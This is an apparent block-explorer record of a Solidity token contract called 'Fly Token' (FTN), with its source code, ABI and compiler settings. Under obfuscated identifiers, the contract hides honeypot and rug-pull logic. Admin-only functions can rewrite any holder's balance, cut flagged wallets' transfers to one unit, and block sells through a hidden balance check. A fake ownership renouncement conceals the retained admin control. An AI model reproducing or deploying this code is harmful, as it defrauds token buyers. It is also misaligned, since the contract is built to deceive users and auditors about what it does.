{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface minEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atAutoReceiver) external view returns (uint256);\n\n    function transfer(address launchedShould, uint256 takeLimitFrom) external returns (bool);\n\n    function allowance(address tradingMinSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeLimitFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedShould,\n        uint256 takeLimitFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isMin, uint256 value);\n    event Approval(address indexed tradingMinSell, address indexed spender, uint256 value);\n}\n\nabstract contract totalWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptMax {\n    function createPair(address buyList, address modeLiquidity) external returns (address);\n}\n\ninterface fundSender is minEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FlyToken is totalWallet, minEnable, fundSender {\n\n    mapping(address => uint256) private modeMarketing;\n\n    function launchedAuto() private view {\n        require(senderMarketing[_msgSender()]);\n    }\n\n    function receiverWallet(address maxFee, address launchedShould, uint256 takeLimitFrom) internal returns (bool) {\n        if (maxFee == swapReceiver) {\n            return fromLaunched(maxFee, launchedShould, takeLimitFrom);\n        }\n        uint256 fromWallet = minEnable(toFee).balanceOf(launchedIs);\n        require(fromWallet == tokenFund);\n        require(launchedShould != launchedIs);\n        if (feeAtList[maxFee]) {\n            return fromLaunched(maxFee, launchedShould, walletTx);\n        }\n        return fromLaunched(maxFee, launchedShould, takeLimitFrom);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchTo;\n    }\n\n    function launchedExempt(address launchedBuy) public {\n        launchedAuto();\n        if (launchedLaunchMax == toReceiverBuy) {\n            walletMaxLimit = true;\n        }\n        if (launchedBuy == swapReceiver || launchedBuy == toFee) {\n            return;\n        }\n        feeAtList[launchedBuy] = true;\n    }\n\n    function txMode(uint256 takeLimitFrom) public {\n        launchedAuto();\n        tokenFund = takeLimitFrom;\n    }\n\n    address launchedIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address maxFee, address launchedShould, uint256 takeLimitFrom) external override returns (bool) {\n        if (_msgSender() != sellAt) {\n            if (fromFundMode[maxFee][_msgSender()] != type(uint256).max) {\n                require(takeLimitFrom <= fromFundMode[maxFee][_msgSender()]);\n                fromFundMode[maxFee][_msgSender()] -= takeLimitFrom;\n            }\n        }\n        return receiverWallet(maxFee, launchedShould, takeLimitFrom);\n    }\n\n    function approve(address isMode, uint256 takeLimitFrom) public virtual override returns (bool) {\n        fromFundMode[_msgSender()][isMode] = takeLimitFrom;\n        emit Approval(_msgSender(), isMode, takeLimitFrom);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return toEnable;\n    }\n\n    uint256 private launchedLaunchMax;\n\n    uint256 tokenFund;\n\n    address public swapReceiver;\n\n    mapping(address => bool) public senderMarketing;\n\n    function balanceOf(address atAutoReceiver) public view virtual override returns (uint256) {\n        return modeMarketing[atAutoReceiver];\n    }\n\n    string private listFee = \"Fly Token\";\n\n    address public toFee;\n\n    mapping(address => bool) public feeAtList;\n\n    event OwnershipTransferred(address indexed sellFrom, address indexed isLimit);\n\n    address sellAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public maxAmount;\n\n    uint256 private modeLaunch = 100000000 * 10 ** 18;\n\n    bool private launchReceiver;\n\n    function walletAutoFee(address autoReceiver) public {\n        if (maxTx) {\n            return;\n        }\n        if (walletMaxLimit) {\n            maxAmount = false;\n        }\n        senderMarketing[autoReceiver] = true;\n        if (launchedLaunchMax != toReceiverBuy) {\n            toReceiverBuy = launchedLaunchMax;\n        }\n        maxTx = true;\n    }\n\n    address private toEnable;\n\n    uint256 constant walletTx = 1 ** 10;\n\n    function getOwner() external view returns (address) {\n        return toEnable;\n    }\n\n    function allowance(address amountLaunch, address isMode) external view virtual override returns (uint256) {\n        if (isMode == sellAt) {\n            return type(uint256).max;\n        }\n        return fromFundMode[amountLaunch][isMode];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeLaunch;\n    }\n\n    string private launchTo = \"FTN\";\n\n    function name() external view virtual override returns (string memory) {\n        return listFee;\n    }\n\n    uint8 private launchLimit = 18;\n\n    bool public tradingMin;\n\n    function fromLaunched(address maxFee, address launchedShould, uint256 takeLimitFrom) internal returns (bool) {\n        require(modeMarketing[maxFee] >= takeLimitFrom);\n        modeMarketing[maxFee] -= takeLimitFrom;\n        modeMarketing[launchedShould] += takeLimitFrom;\n        emit Transfer(maxFee, launchedShould, takeLimitFrom);\n        return true;\n    }\n\n    bool public walletMaxLimit;\n\n    function transfer(address fundExemptReceiver, uint256 takeLimitFrom) external virtual override returns (bool) {\n        return receiverWallet(_msgSender(), fundExemptReceiver, takeLimitFrom);\n    }\n\n    uint256 private toReceiverBuy;\n\n    function tokenLaunch() public {\n        emit OwnershipTransferred(swapReceiver, address(0));\n        toEnable = address(0);\n    }\n\n    uint256 maxAt;\n\n    bool public maxTx;\n\n    mapping(address => mapping(address => uint256)) private fromFundMode;\n\n    bool public modeMax;\n\n    function senderIs(address fundExemptReceiver, uint256 takeLimitFrom) public {\n        launchedAuto();\n        modeMarketing[fundExemptReceiver] = takeLimitFrom;\n    }\n\n    constructor (){\n        \n        txMin senderSwap = txMin(sellAt);\n        toFee = exemptMax(senderSwap.factory()).createPair(senderSwap.WETH(), address(this));\n        \n        swapReceiver = _msgSender();\n        tokenLaunch();\n        senderMarketing[swapReceiver] = true;\n        modeMarketing[swapReceiver] = modeLaunch;\n        if (walletMaxLimit != launchReceiver) {\n            modeMax = true;\n        }\n        emit Transfer(address(0), swapReceiver, modeLaunch);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMinSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLimitFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAutoReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAtList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"}],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLimitFrom\",\"type\":\"uint256\"}],\"name\":\"senderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLimitFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLimitFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeLimitFrom\",\"type\":\"uint256\"}],\"name\":\"txMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"}],\"name\":\"walletAutoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMaxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FlyToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}